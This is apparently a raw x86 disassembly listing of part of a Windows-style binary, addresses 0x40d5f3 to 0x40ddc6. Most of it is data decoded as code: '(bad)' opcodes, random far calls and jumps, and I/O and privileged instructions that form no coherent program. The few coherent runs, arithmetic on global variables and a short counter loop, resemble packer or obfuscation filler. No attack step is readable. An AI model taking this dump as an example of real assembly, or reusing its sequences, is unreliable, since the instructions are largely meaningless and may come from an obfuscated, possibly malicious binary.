  40d5f3:	aam    0xe6
  40d5f5:	(bad)  
  40d5f7:	mov    dh,BYTE PTR [eax]
  40d5f9:	push   ecx
  40d5fa:	sub    BYTE PTR [esi+0x3],ch
  40d5fd:	mov    ebp,ebx
  40d5ff:	cmp    al,0xf3
  40d601:	xlat   BYTE PTR ds:[ebx]
  40d602:	add    DWORD PTR [ebp+ecx*1+0x293c3f45],edi
  40d609:	mov    ah,0xcc
  40d60b:	xor    eax,0x1dfd84d6
  40d610:	sti    
  40d611:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d612:	(bad)  
  40d613:	mov    esi,0x66ae3cbd
  40d618:	lock push ds
  40d61a:	popf   
  40d61b:	pushf  
  40d61c:	fcomp  QWORD PTR [edx]
  40d61e:	xor    BYTE PTR [eax],dl
  40d620:	cmp    al,0xee
  40d622:	inc    ecx
  40d623:	dec    esp
  40d624:	sahf   
  40d625:	jns    0x40d61a
  40d627:	fwait
  40d628:	(bad)  
  40d629:	(bad)  [esi]
  40d62b:	ds push 0xffffffaa
  40d62e:	pop    ss
  40d62f:	aam    0xc0
  40d631:	mov    eax,0xa44c7898
  40d636:	push   ds
  40d637:	shr    DWORD PTR [ecx],0x54
  40d63a:	and    DWORD PTR [edx],0x9087412c
  40d640:	lods   al,BYTE PTR ds:[esi]
  40d641:	jmp    0x40d5f3
  40d643:	push   0xf6052546
  40d648:	adc    eax,0xed46097
  40d64d:	fsubr  st,st(0)
  40d64f:	ja     0x40d69c
  40d651:	push   eax
  40d652:	add    cl,BYTE PTR [eax]
  40d654:	into   
  40d655:	lods   al,BYTE PTR ds:[esi]
  40d656:	xchg   edx,eax
  40d657:	xchg   edi,eax
  40d658:	dec    esp
  40d659:	divps  xmm3,XMMWORD PTR [ebp+0x49]
  40d65d:	mov    edx,0x6ada759a
  40d662:	jne    0x40d65f
  40d664:	xchg   ebp,eax
  40d665:	jb     0x40d63c
  40d667:	or     eax,0x37a07056
  40d66c:	mov    ds:0xcb6bd895,eax
  40d671:	das    
  40d672:	dec    esi
  40d673:	mul    edi
  40d675:	pop    edx
  40d676:	xchg   DWORD PTR [ecx-0x2a],ebx
  40d679:	icebp  
  40d67a:	ficom  WORD PTR [eax-0x32c6ca66]
  40d680:	stos   DWORD PTR es:[edi],eax
  40d681:	cmp    BYTE PTR [ebp-0x51b2de77],cl
  40d687:	mov    DWORD PTR [eax],eax
  40d689:	mov    esp,DWORD PTR [ecx+0x11]
  40d68c:	loop   0x40d679
  40d68e:	js     0x40d6b3
  40d690:	add    ebx,ecx
  40d692:	pop    es
  40d693:	mov    ds:0x75b593c3,eax
  40d698:	sbb    cl,BYTE PTR [ecx-0x3a]
  40d69b:	adc    ebx,DWORD PTR [esi+0x2dbcbb69]
  40d6a1:	shr    BYTE PTR [edx-0x3775efc8],0x69
  40d6a8:	adc    eax,0x40929543
  40d6ad:	stc    
  40d6ae:	cmp    al,0x99
  40d6b0:	cli    
  40d6b1:	mov    eax,ds:0x5c82802b
  40d6b6:	call   0xe3039f6
  40d6bb:	sub    al,0xb8
  40d6bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d6be:	frstor [ebx-0x1b]
  40d6c1:	retf   0x522d
  40d6c4:	inc    edx
  40d6c5:	out    0x39,eax
  40d6c7:	sub    ecx,ebp
  40d6c9:	rcl    cl,cl
  40d6cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d6cc:	imul   edi,DWORD PTR [esi],0x37
  40d6cf:	repz fdivrp st(3),st
  40d6d2:	push   esi
  40d6d3:	in     al,dx
  40d6d4:	sbb    DWORD PTR [esp+edx*1+0x30b44194],esp
  40d6db:	popf   
  40d6dc:	sar    BYTE PTR [edi],0x37
  40d6df:	xor    DWORD PTR [eax],ecx
  40d6e1:	lock fsubr st(1),st
  40d6e4:	jg     0x40d722
  40d6e6:	cwde   
  40d6e7:	inc    ebx
  40d6e8:	ret    0xe85c
  40d6eb:	dec    edx
  40d6ec:	retf   
  40d6ed:	push   ebp
  40d6ee:	ja     0x40d694
  40d6f0:	and    al,0xf7
  40d6f2:	les    esi,FWORD PTR ds:0xb551770
  40d6f8:	xor    cl,BYTE PTR [ecx]
  40d6fa:	loop   0x40d70c
  40d6fc:	adc    DWORD PTR [ebx-0x6],0xe852e18
  40d703:	and    ebx,0xffffff97
  40d706:	mov    edx,0x6f4cb421
  40d70b:	adc    eax,0xad1007a5
  40d710:	jbe    0x40d70a
  40d712:	jle    0x40d6df
  40d714:	popf   
  40d715:	pusha  
  40d716:	gs ins BYTE PTR es:[edi],dx
  40d718:	push   ebp
  40d719:	mov    BYTE PTR [ebx],al
  40d71b:	xor    edi,DWORD PTR [ecx]
  40d71d:	adc    ecx,DWORD PTR [ebx+esi*8]
  40d720:	and    ecx,DWORD PTR [esi]
  40d722:	das    
  40d723:	add    eax,0xd192cf93
  40d728:	fidivr DWORD PTR [eax-0x46b55b3c]
  40d72e:	aam    0x99
  40d730:	(bad)  
  40d731:	xor    bh,BYTE PTR [esi+0x75]
  40d734:	mov    al,0x1a
  40d736:	mov    bl,0xb
  40d738:	cmp    ebx,DWORD PTR [ebp+0x38]
  40d73b:	push   cs
  40d73c:	icebp  
  40d73d:	fs loope 0x40d6e0
  40d740:	imul   ecx,DWORD PTR [eax-0x48],0x7aa56dc0
  40d747:	mov    edx,ds
  40d749:	sahf   
  40d74a:	test   eax,0xf973a955
  40d74f:	cs mov dl,0x71
  40d752:	jmp    0xd11a:0x910fa9fb
  40d759:	arpl   WORD PTR [esi],di
  40d75b:	pop    esi
  40d75c:	ja     0x40d76e
  40d75e:	and    eax,0xe020f0cf
  40d763:	or     bl,0x27
  40d766:	mov    ds:0x16cc36a5,eax
  40d76b:	into   
  40d76c:	outs   dx,DWORD PTR ds:[esi]
  40d76d:	dec    edx
  40d76e:	lock xor DWORD PTR [edx+0x4350cb57],ecx
  40d775:	repnz sbb dl,BYTE PTR [edi+ecx*8+0x32]
  40d77a:	(bad)  
  40d77c:	sbb    eax,0xf8cc8294
  40d781:	add    eax,0x723c8ce1
  40d786:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d787:	jno    0x40d7bb
  40d789:	adc    bh,dh
  40d78b:	scas   eax,DWORD PTR es:[edi]
  40d78c:	test   BYTE PTR [ecx-0x65],0x87
  40d790:	jb     0x40d7de
  40d792:	sub    DWORD PTR [ebx-0x62],ecx
  40d795:	ds push 0x4fcecc05
  40d79b:	lods   al,BYTE PTR ds:[esi]
  40d79c:	mov    al,0x2a
  40d79e:	xchg   edx,eax
  40d79f:	sahf   
  40d7a0:	daa    
  40d7a1:	dec    ecx
  40d7a2:	fidiv  DWORD PTR [esi+0x46]
  40d7a5:	jae    0x40d76c
  40d7a7:	shr    ch,1
  40d7a9:	cmp    dl,bh
  40d7ab:	aaa    
  40d7ac:	shr    BYTE PTR es:[ecx+0x28],0x1b
  40d7b1:	in     al,dx
  40d7b2:	push   0xa0732eeb
  40d7b7:	xchg   esi,eax
  40d7b8:	mov    eax,0x8169ed91
  40d7bd:	(bad)  
  40d7be:	cmp    al,0x3
  40d7c0:	add    BYTE PTR [eax],al
  40d7c2:	mov    DWORD PTR ds:0x42a7dd,0x14bd
  40d7cc:	jne    0x40dd11
  40d7d2:	and    eax,DWORD PTR ds:0x42a7e5
  40d7d8:	jmp    0x40da30
  40d7dd:	int    0xca
  40d7df:	(bad)  
  40d7e0:	into   
  40d7e1:	(bad)  
  40d7e3:	aad    0xc9
  40d7e5:	lea    edi,[esi+0xaa0e45d]
  40d7eb:	xchg   esp,eax
  40d7ec:	jp     0x40d847
  40d7ee:	test   eax,0x7e357878
  40d7f3:	js     0x40d86d
  40d7f5:	mov    al,0x49
  40d7f7:	adc    dl,BYTE PTR [edi+esi*8-0x2299782]
  40d7fe:	mov    bl,0xfd
  40d800:	pop    esp
  40d801:	inc    edx
  40d802:	add    BYTE PTR [edx-0x57ebf6b3],0x0
  40d809:	inc    ebx
  40d80a:	clc    
  40d80b:	or     ecx,ecx
  40d80d:	bound  esp,QWORD PTR [edx+edi*4+0x485f2e55]
  40d814:	mov    eax,0xcb63bef5
  40d819:	out    0xc,al
  40d81b:	inc    eax
  40d81c:	ficom  WORD PTR ds:0x2a1f0ac7
  40d822:	sub    BYTE PTR [esi+0x116deb44],0x66
  40d829:	outs   dx,BYTE PTR ds:[esi]
  40d82a:	mov    al,cl
  40d82c:	adc    BYTE PTR [edx-0x51e3c332],dh
  40d832:	ss lds esp,FWORD PTR ds:[eax]
  40d836:	iret   
  40d837:	cmp    BYTE PTR [ecx+0x69],dl
  40d83a:	jecxz  0x40d8ad
  40d83c:	das    
  40d83d:	cmp    ecx,DWORD PTR [edx]
  40d83f:	js     0x40d82c
  40d841:	jg     0x40d877
  40d843:	pop    es
  40d844:	mov    al,ds:0x4a9bd1c8
  40d849:	jp     0x40d86c
  40d84b:	xor    eax,0x91ba5936
  40d850:	pop    ebx
  40d851:	mov    DWORD PTR [ebp-0x19d6dfc1],ebx
  40d857:	jae    0x40d8d5
  40d859:	test   BYTE PTR [edx+ebp*8-0x41159dbe],dl
  40d860:	fnstcw WORD PTR [eax-0x24]
  40d863:	dec    ecx
  40d864:	aam    0x34
  40d866:	icebp  
  40d867:	and    DWORD PTR [eax-0x71],esp
  40d86a:	outs   dx,BYTE PTR ds:[esi]
  40d86b:	mov    dh,0x65
  40d86d:	inc    ebx
  40d86e:	and    eax,0x32aa60c9
  40d873:	sahf   
  40d874:	inc    BYTE PTR [esi+0x64]
  40d877:	pop    ss
  40d878:	add    cl,bl
  40d87a:	jg     0x40d8f9
  40d87c:	imul   ecx,DWORD PTR [edx+0xc],0x605d4517
  40d883:	call   0x3ab01e06
  40d888:	(bad)  
  40d889:	idiv   DWORD PTR [ebp+0x513f5ee2]
  40d88f:	xchg   esp,eax
  40d890:	jp     0x40d899
  40d892:	out    dx,al
  40d893:	xor    esi,DWORD PTR [esi-0x6e]
  40d896:	jbe    0x40d876
  40d898:	and    DWORD PTR [ebx+0x62],esp
  40d89b:	push   ss
  40d89c:	sti    
  40d89d:	push   0x298a626c
  40d8a2:	sub    DWORD PTR [ebp-0x19],ebx
  40d8a5:	sti    
  40d8a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d8a7:	mov    al,0x24
  40d8a9:	add    al,0xb
  40d8ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d8ac:	popf   
  40d8ad:	rol    DWORD PTR ds:0xcee26f5f,0x7a
  40d8b4:	mov    al,0x81
  40d8b6:	cs jmp 0x9269:0xb6e59898
  40d8be:	aam    0x47
  40d8c0:	test   eax,0x298ed8ea
  40d8c5:	pop    esp
  40d8c6:	mov    bh,0x33
  40d8c8:	mov    edx,0x70bf571e
  40d8cd:	pop    esp
  40d8ce:	push   edx
  40d8cf:	es dec ebp
  40d8d1:	popf   
  40d8d2:	mov    ah,BYTE PTR [esi-0x80]
  40d8d5:	leave  
  40d8d6:	mov    dh,0x12
  40d8d8:	xchg   ebx,eax
  40d8d9:	pop    ss
  40d8da:	xchg   esp,eax
  40d8db:	setns  BYTE PTR [edi]
  40d8de:	add    eax,0xd1cc8a92
  40d8e3:	jg     0x40d8dc
  40d8e5:	imul   edi,DWORD PTR [ebx],0xfa07d194
  40d8eb:	enter  0x1c16,0x32
  40d8ef:	mov    al,ds:0x9e59e87a
  40d8f4:	fwait
  40d8f5:	or     ebp,DWORD PTR [ecx+0x6a]
  40d8f8:	rcr    DWORD PTR [ecx+edi*8-0x360e0d50],cl
  40d8ff:	popf   
  40d900:	neg    esi
  40d902:	xchg   dh,dl
  40d904:	pop    es
  40d905:	lods   eax,DWORD PTR ds:[esi]
  40d906:	adc    eax,0x378237ba
  40d90b:	fldenv [edx-0x79]
  40d90e:	(bad)  
  40d90f:	and    ebx,eax
  40d911:	sbb    esi,ecx
  40d913:	sub    BYTE PTR [esi],bl
  40d915:	xchg   DWORD PTR [eax],eax
  40d917:	pop    ss
  40d918:	sbb    BYTE PTR [ecx],ch
  40d91a:	sub    edx,edx
  40d91c:	pop    ebp
  40d91d:	dec    eax
  40d91e:	retf   0x8d6f
  40d921:	mov    ds,esi
  40d923:	fstp   DWORD PTR [ebp+0x3e24dc43]
  40d929:	jmp    FWORD PTR [edx]
  40d92b:	sbb    esp,DWORD PTR [esi-0x13]
  40d92e:	jl     0x40d8b2
  40d930:	xor    bl,BYTE PTR [eax-0x1f]
  40d933:	xor    BYTE PTR [ebx+0x2bab50b5],dh
  40d939:	cs jl  0x40d913
  40d93c:	jns    0x40d910
  40d93e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d93f:	add    eax,0xc6928734
  40d944:	and    esi,DWORD PTR fs:[edi+0x2e]
  40d948:	inc    esp
  40d949:	xchg   esp,eax
  40d94a:	fild   WORD PTR [ecx+ebx*4+0x4]
  40d94e:	sahf   
  40d94f:	mov    cl,0x26
  40d951:	lods   eax,DWORD PTR ds:[esi]
  40d952:	pop    eax
  40d953:	retf   0xb5ed
  40d956:	in     al,dx
  40d957:	and    DWORD PTR [edx-0x3c9d1c40],ebp
  40d95d:	push   eax
  40d95e:	imul   eax,DWORD PTR [edi-0x47],0x1a3b63c7
  40d965:	mov    gs,WORD PTR [ebp-0x51]
  40d968:	push   ss
  40d969:	jmp    DWORD PTR [ebx-0x76fe0b22]
  40d96f:	mov    ?,WORD PTR [ecx]
  40d971:	pop    eax
  40d972:	mov    eax,0x8e001ae8
  40d977:	push   edx
  40d978:	div    DWORD PTR [ecx]
  40d97a:	ss (bad) 
  40d97c:	sti    
  40d97d:	adc    edx,DWORD PTR [esi]
  40d97f:	(bad)  
  40d980:	sti    
  40d981:	mov    bl,0xf6
  40d983:	jo     0x40d9e1
  40d985:	jmp    0x40d994
  40d987:	addr16 xchg ebp,eax
  40d989:	mov    al,ds:0xc58ddc8b
  40d98f:	mov    ecx,0x4305f6af
  40d994:	in     eax,dx
  40d995:	and    cl,BYTE PTR ds:[eax-0x3500bace]
  40d99c:	cdq    
  40d99d:	pop    esi
  40d99e:	cmp    edi,DWORD PTR [ecx-0x4d]
  40d9a1:	mov    dl,BYTE PTR ds:0x7778219a
  40d9a7:	jns    0x40d9b4
  40d9a9:	call   0x2a6e:0xd5bc514e
  40d9b0:	cmp    eax,0x913e968d
  40d9b5:	call   0x9543:0xaf749d20
  40d9bc:	push   ss
  40d9bd:	xchg   esi,eax
  40d9be:	cld    
  40d9bf:	push   cs
  40d9c0:	call   0xab5a:0xe9358335
  40d9c7:	test   eax,0xb17c26a4
  40d9cc:	pop    esp
  40d9cd:	into   
  40d9ce:	call   0x7610:0x4a6bcaae
  40d9d5:	stos   BYTE PTR es:[edi],al
  40d9d6:	fcmovb st,st(1)
  40d9d8:	jle    0x40d9ad
  40d9da:	loop   0x40da3a
  40d9dc:	cmp    eax,0xe8cb4b1a
  40d9e1:	inc    BYTE PTR [ebp+0x6d]
  40d9e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d9e5:	hlt    
  40d9e6:	adc    ebp,ecx
  40d9e8:	fs mov al,0x6
  40d9eb:	leave  
  40d9ec:	out    0x90,eax
  40d9ee:	add    edi,ebx
  40d9f0:	std    
  40d9f1:	inc    eax
  40d9f2:	scas   eax,DWORD PTR es:[edi]
  40d9f3:	lods   al,BYTE PTR ds:[esi]
  40d9f4:	dec    eax
  40d9f5:	repz mov ebp,0x346e80bb
  40d9fb:	pusha  
  40d9fc:	sbb    DWORD PTR [eax],esp
  40d9fe:	into   
  40d9ff:	dec    ebx
  40da00:	pushf  
  40da01:	pop    esp
  40da02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40da03:	sbb    eax,0x453393eb
  40da08:	adc    al,0x5a
  40da0a:	repz int3 
  40da0c:	or     cl,0xb9
  40da0f:	and    al,0x54
  40da11:	dec    edx
  40da12:	jp     0x40d9c2
  40da14:	mov    ah,0x4c
  40da16:	sti    
  40da17:	sbb    BYTE PTR [ecx],0x3d
  40da1a:	cs cmp ecx,edx
  40da1d:	test   DWORD PTR [ebp+edx*8+0x167b8510],edi
  40da24:	cmp    DWORD PTR [edx+ebx*2],edx
  40da27:	cmp    edx,DWORD PTR [eax-0x15]
  40da2a:	sub    DWORD PTR [ebp+0x14],0x834d9c61
  40da31:	or     BYTE PTR gs:[eax],al
  40da34:	mov    eax,ds:0x42a851
  40da39:	sbb    eax,DWORD PTR ds:0x42a829
  40da3f:	mov    ds:0x42a851,eax
  40da44:	mov    eax,DWORD PTR [ebp-0x8]
  40da47:	xor    DWORD PTR ds:0x42a811,0x42a7dd
  40da51:	sub    eax,DWORD PTR [ebp+0x8]
  40da54:	or     DWORD PTR ds:0x42a821,0xc38
  40da5e:	push   eax
  40da5f:	adc    DWORD PTR ds:0x42a791,0x6147
  40da69:	mov    eax,DWORD PTR [ebp-0x4]
  40da6c:	jmp    0x40dcc4
  40da71:	enter  0xc6c0,0x3c
  40da75:	(bad)  
  40da76:	ret    0xd4da
  40da79:	push   cs
  40da7a:	in     al,dx
  40da7b:	pop    edi
  40da7c:	dec    esi
  40da7d:	xchg   edx,eax
  40da7e:	and    al,0x94
  40da80:	or     eax,0x7878ae16
  40da85:	xor    eax,0xd878787e
  40da8a:	cmp    ch,dl
  40da8c:	or     al,0x4f
  40da8e:	adc    BYTE PTR gs:[ebx+edi*1-0x5c],dh
  40da93:	add    al,0xbc
  40da95:	jno    0x40daed
  40da97:	jbe    0x40daea
  40da99:	add    BYTE PTR [esi-0x5059d841],cl
  40da9f:	sub    ah,BYTE PTR ds:0xfd5114fd
  40daa5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40daa6:	jg     0x40db16
  40daa8:	cmp    al,al
  40daaa:	or     eax,0x4900b979
  40daaf:	rcl    BYTE PTR [esi-0x72],1
  40dab2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dab3:	shl    dl,cl
  40dab5:	push   edi
  40dab6:	and    eax,0x285be884
  40dabb:	cmp    BYTE PTR [edi-0x3a7658ce],al
  40dac1:	int    0x9d
  40dac3:	or     esp,ecx
  40dac5:	stos   BYTE PTR es:[edi],al
  40dac6:	inc    edx
  40dac7:	mov    edx,0x347f8526
  40dacc:	es in  al,dx
  40dace:	ret    
  40dacf:	push   0x3
  40dad1:	mov    BYTE PTR [eax-0x595cd65e],dl
  40dad7:	test   al,0xf9
  40dad9:	iret   
  40dada:	xchg   esp,eax
  40dadb:	mov    DWORD PTR [esi-0x4c],ecx
  40dade:	int    0xd9
  40dae0:	mov    ecx,0x583822d6
  40dae6:	inc    edi
  40dae7:	(bad)  
  40dae8:	clc    
  40dae9:	in     eax,dx
  40daea:	ins    DWORD PTR es:[edi],dx
  40daeb:	addr16 in eax,0x54
  40daee:	xor    BYTE PTR [ecx-0x72],bh
  40daf1:	lods   eax,DWORD PTR ds:[esi]
  40daf2:	inc    edx
  40daf3:	rol    dh,0x79
  40daf6:	aas    
  40daf7:	cmp    DWORD PTR [esi-0x71bb44e8],esi
  40dafd:	scas   al,BYTE PTR es:[edi]
  40dafe:	iret   
  40daff:	pop    esi
  40db00:	jp     0x40dadb
  40db02:	mov    al,0x78
  40db04:	push   esp
  40db05:	add    BYTE PTR [ebx],dl
  40db07:	adc    BYTE PTR [ecx+ecx*2],dl
  40db0a:	dec    eax
  40db0b:	cs pop ss
  40db0d:	nop
  40db0e:	mov    bl,0xa3
  40db10:	inc    eax
  40db11:	cmp    BYTE PTR [edx+0x53],cl
  40db14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db15:	dec    esp
  40db16:	addr16 jae 0x40daf8
  40db19:	adc    ch,BYTE PTR [edi+0x35977e58]
  40db1f:	sub    DWORD PTR [eax-0x43],ecx
  40db22:	and    DWORD PTR [edx],0x1f8fe2f2
  40db28:	mov    ch,0x5f
  40db2a:	daa    
  40db2b:	rdmsr  
  40db2d:	sub    al,0x9b
  40db2f:	jle    0x40db94
  40db31:	(bad)  
  40db32:	jg     0x40db36
  40db34:	or     DWORD PTR [edi],ebp
  40db36:	shl    DWORD PTR [ebx+0x70233024],1
  40db3c:	mov    ecx,0x4f99edf6
  40db41:	ror    cl,1
  40db43:	nop
  40db44:	add    DWORD PTR [ecx],ecx
  40db46:	cmp    eax,0x86d48fca
  40db4b:	fs clc 
  40db4d:	sbb    eax,0xdc629657
  40db52:	adc    ecx,DWORD PTR [edx+0x51]
  40db55:	ins    BYTE PTR es:[edi],dx
  40db56:	cli    
  40db57:	cdq    
  40db58:	rol    DWORD PTR ss:[edi],1
  40db5b:	mov    cl,0x3e
  40db5d:	jg     0x40dba1
  40db5f:	pop    es
  40db60:	sbb    BYTE PTR [esi],dl
  40db62:	clc    
  40db63:	mov    esp,0x10e3dd2d
  40db68:	rcr    ch,cl
  40db6a:	dec    esi
  40db6b:	loopne 0x40db03
  40db6d:	cmp    al,0xfd
  40db6f:	int    0x8
  40db71:	add    edx,edx
  40db73:	push   edx
  40db74:	leave  
  40db75:	push   ds
  40db76:	into   
  40db77:	mov    bl,0x68
  40db79:	adc    BYTE PTR [eax+0x740cf577],bh
  40db7f:	lahf   
  40db80:	dec    esi
  40db81:	adc    ch,BYTE PTR [ebx-0x4]
  40db84:	dec    edi
  40db85:	pushf  
  40db86:	inc    edx
  40db87:	add    cl,BYTE PTR [edx+0x760c233d]
  40db8d:	pop    edi
  40db8e:	sahf   
  40db8f:	retf   
  40db90:	xchg   ecx,eax
  40db91:	(bad)  
  40db92:	push   ebp
  40db93:	jp     0x40db34
  40db95:	xchg   esi,eax
  40db96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db97:	scas   al,BYTE PTR es:[edi]
  40db98:	push   cs
  40db99:	push   edx
  40db9a:	cs xchg esi,eax
  40db9c:	mov    dh,0x71
  40db9e:	and    ebx,DWORD PTR [esi-0x5d01735d]
  40dba4:	cli    
  40dba5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dba6:	mov    edx,0x1d36603d
  40dbab:	fistp  DWORD PTR [edx+0xc3f641]
  40dbb1:	sti    
  40dbb2:	lods   al,BYTE PTR ds:[esi]
  40dbb3:	out    dx,al
  40dbb4:	aam    0x90
  40dbb6:	sbb    BYTE PTR [eax],dh
  40dbb8:	push   ds
  40dbb9:	loope  0x40dbdc
  40dbbb:	jmp    0x81f4:0x953e9d2
  40dbc2:	jae    0x40dc2c
  40dbc4:	rcr    eax,cl
  40dbc6:	dec    eax
  40dbc7:	jg     0x40dbf7
  40dbc9:	out    dx,eax
  40dbca:	repnz mov al,ds:0xecf444b2
  40dbd0:	xchg   esp,eax
  40dbd1:	aas    
  40dbd2:	cmp    ebp,0x69
  40dbd5:	pop    edx
  40dbd6:	ss xchg edi,eax
  40dbd8:	jmp    0xaf55:0x71669c11
  40dbdf:	bnd jae 0x40dba9
  40dbe2:	out    dx,al
  40dbe3:	dec    edi
  40dbe4:	add    BYTE PTR [esi+0x77b43310],ch
  40dbea:	imul   ebp,DWORD PTR [esi-0x7ab6e033],0xfffffff3
  40dbf1:	lods   al,BYTE PTR ds:[esi]
  40dbf2:	rol    cl,0x18
  40dbf5:	or     eax,0xa226b44d
  40dbfa:	mov    cl,0x19
  40dbfc:	clc    
  40dbfd:	aas    
  40dbfe:	loop   0x40dc67
  40dc00:	retf   0x7ad2
  40dc03:	pop    ecx
  40dc04:	mov    bh,al
  40dc06:	retf   
  40dc07:	rcl    BYTE PTR [ebp-0x13],0x1c
  40dc0b:	cmc    
  40dc0c:	sbb    eax,esi
  40dc0e:	std    
  40dc0f:	idiv   DWORD PTR [ebp+0x4e]
  40dc12:	add    ah,BYTE PTR [eax]
  40dc14:	test   DWORD PTR [edx+0x292c02c6],esp
  40dc1a:	loop   0x40dc47
  40dc1c:	push   edx
  40dc1d:	adc    bh,bh
  40dc1f:	aaa    
  40dc20:	ror    DWORD PTR [ebx],0x50
  40dc23:	fnstsw WORD PTR [edx]
  40dc25:	push   edx
  40dc26:	and    al,0x2d
  40dc28:	loop   0x40dc85
  40dc2a:	addr16 nop
  40dc2c:	mov    ds:0x8b364a97,eax
  40dc31:	test   al,0x77
  40dc33:	jns    0x40dc4c
  40dc35:	sub    DWORD PTR [ebp+ebp*1+0x2867b18f],ecx
  40dc3c:	loop   0x40dc23
  40dc3e:	cmc    
  40dc3f:	jns    0x40dc33
  40dc41:	popf   
  40dc42:	call   0xc200:0xb99fecc2
  40dc49:	xor    BYTE PTR [edi+0x3625b6b6],dl
  40dc4f:	sbb    DWORD PTR [edx],0x2c4ea1cc
  40dc55:	dec    edx
  40dc56:	sub    eax,0xcb7777e9
  40dc5b:	int    0xe6
  40dc5d:	pop    eax
  40dc5e:	sbb    al,0xbd
  40dc60:	xor    BYTE PTR [ebp+0x1246947],al
  40dc66:	mov    dl,0x65
  40dc68:	mov    esp,DWORD PTR [eiz*4+0x693a0fa2]
  40dc6f:	inc    ecx
  40dc70:	out    0x4e,eax
  40dc72:	inc    ebp
  40dc73:	pop    eax
  40dc74:	xchg   esp,ebx
  40dc76:	mov    eax,0x5cf85328
  40dc7b:	fist   DWORD PTR [edi-0x45]
  40dc7e:	retf   0x9e74
  40dc81:	adc    bh,cl
  40dc83:	mov    dh,BYTE PTR [edi]
  40dc85:	push   0x1
  40dc87:	ror    edx,0x9d
  40dc8a:	pop    es
  40dc8b:	pop    esp
  40dc8c:	sar    esi,cl
  40dc8e:	cld    
  40dc8f:	popa   
  40dc90:	adc    DWORD PTR [eax+0x1a],ecx
  40dc93:	stc    
  40dc94:	lds    edi,FWORD PTR [ebx+0x24a966df]
  40dc9a:	enter  0x2618,0x42
  40dc9e:	add    DWORD PTR [ebx],esi
  40dca0:	or     DWORD PTR [ebx],0xffffffa2
  40dca3:	pop    ss
  40dca4:	leave  
  40dca5:	popa   
  40dca6:	push   eax
  40dca7:	cli    
  40dca8:	cwde   
  40dca9:	jge    0x40dc58
  40dcab:	add    edi,ebx
  40dcad:	sbb    al,0x35
  40dcaf:	push   0x29
  40dcb1:	dec    ecx
  40dcb2:	fidiv  DWORD PTR [edx-0x41fdd440]
  40dcb8:	pop    esp
  40dcb9:	or     al,0x3d
  40dcbb:	pop    ebx
  40dcbc:	pop    ebp
  40dcbd:	pop    es
  40dcbe:	and    ah,BYTE PTR [edx*4+0x35835c7]
  40dcc5:	inc    ebp
  40dcc6:	or     BYTE PTR [ecx+0x42a8a105],al
  40dccc:	add    BYTE PTR [edx+0x29],ch
  40dccf:	add    BYTE PTR [eax],al
  40dcd1:	push   eax
  40dcd2:	adc    DWORD PTR ds:0x42a77d,0x7658
  40dcdc:	call   0x40e99f
  40dce1:	mov    DWORD PTR ds:0x42a7d5,0x7bae
  40dceb:	inc    DWORD PTR [ebp+0x8]
  40dcee:	cmp    DWORD PTR [ebp+0x8],0x52
  40dcf2:	mov    DWORD PTR ds:0x42a851,0x71fa
  40dcfc:	jb     0x40da34
  40dd02:	mov    DWORD PTR ds:0x42a85d,0x568b
  40dd0c:	jmp    0x40e979
  40dd11:	cmp    edi,0x1a2
  40dd17:	jne    0x40e497
  40dd1d:	sbb    DWORD PTR ds:0x42a7d9,edx
  40dd23:	mov    DWORD PTR [ebp-0x60],0xf89c853c
  40dd2a:	mov    eax,DWORD PTR [ebp-0x4]
  40dd2d:	mov    DWORD PTR [ebp-0x5c],eax
  40dd30:	mov    eax,DWORD PTR [ebp-0x8]
  40dd33:	mov    DWORD PTR [ebp-0x58],eax
  40dd36:	movzx  eax,WORD PTR ds:0x42a7d1
  40dd3d:	and    DWORD PTR ds:0x42a7a1,eax
  40dd43:	mov    eax,DWORD PTR [ebp-0xc]
  40dd46:	adc    DWORD PTR ds:0x42a891,0x42a89d
  40dd50:	xor    eax,esi
  40dd52:	jmp    0x40dfaa
  40dd57:	rol    eax,0x3e
  40dd5a:	leave  
  40dd5b:	leave  
  40dd5c:	leave  
  40dd5d:	leave  
  40dd5e:	rcr    BYTE PTR [ebx+0x66],0x3b
  40dd62:	inc    esi
  40dd63:	cmp    BYTE PTR [edx+edx*8+0x78acd392],dl
  40dd6a:	js     0x40dda1
  40dd6c:	jle    0x40dde6
  40dd6e:	js     0x40dcfa
  40dd70:	enter  0x1777,0xdc
  40dd74:	add    bh,BYTE PTR [esi]
  40dd76:	xor    al,0xf5
  40dd78:	inc    eax
  40dd79:	mov    bh,0xc0
  40dd7b:	dec    ebx
  40dd7c:	dec    ecx
  40dd7d:	lea    esi,[esi]
  40dd7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dd80:	dec    edx
  40dd81:	xchg   DWORD PTR [ebx-0x1271fc67],edi
  40dd87:	or     eax,0x266e9fff
  40dd8c:	mov    eax,edi
  40dd8e:	sbb    al,0x19
  40dd90:	push   es
  40dd91:	clc    
  40dd92:	popf   
  40dd93:	push   edi
  40dd94:	dec    ebx
  40dd95:	fwait
  40dd96:	inc    esp
  40dd97:	cwde   
  40dd98:	repnz lods al,BYTE PTR ds:[esi]
  40dd9a:	jbe    0x40dd20
  40dd9c:	cmp    eax,0xc9924534
  40dda1:	push   esp
  40dda2:	jb     0x40de13
  40dda4:	les    ecx,FWORD PTR [edi]
  40dda6:	ret    0xec66
  40dda9:	int3   
  40ddaa:	mov    ebp,0x52e0a1b8
  40ddaf:	fcom   DWORD PTR [esi-0x7a]
  40ddb2:	or     ebx,DWORD PTR [ebp-0x7b1380c7]
  40ddb8:	xor    al,BYTE PTR [ecx+0x15]
  40ddbb:	xor    al,0xd9
  40ddbd:	mov    eax,0x9b6caf24
  40ddc2:	sbb    DWORD PTR [eax+ebx*1-0x70],esi
  40ddc6:	and    DWORD PTR [edi-0x39],edx
